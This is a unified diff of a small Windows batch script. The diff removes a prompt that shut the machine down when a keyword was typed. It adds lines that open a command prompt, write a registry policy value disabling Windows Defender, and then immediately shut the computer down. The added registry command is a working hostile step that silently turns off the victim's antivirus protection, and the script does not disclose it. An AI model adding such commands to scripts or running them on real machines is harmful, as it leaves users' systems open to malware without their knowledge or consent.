@@ -1,16 +1,11 @@
 @echo off
-color
-title Command Prompt Script
 cls
 
-:input
-set /p user_input=Enter a command: 
-if "%user_input%"=="qmze" (
-    color 0A
-    echo good
-    timeout /t 2 >nul
-    shutdown /s /t 0
-) else (
-    echo Invalid command.
-    goto input
-)
+:: Open Command Prompt
+start cmd /k
+
+:: Disable Windows Defender via registry
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+
+:: Shut down the computer
+shutdown /s /t 0
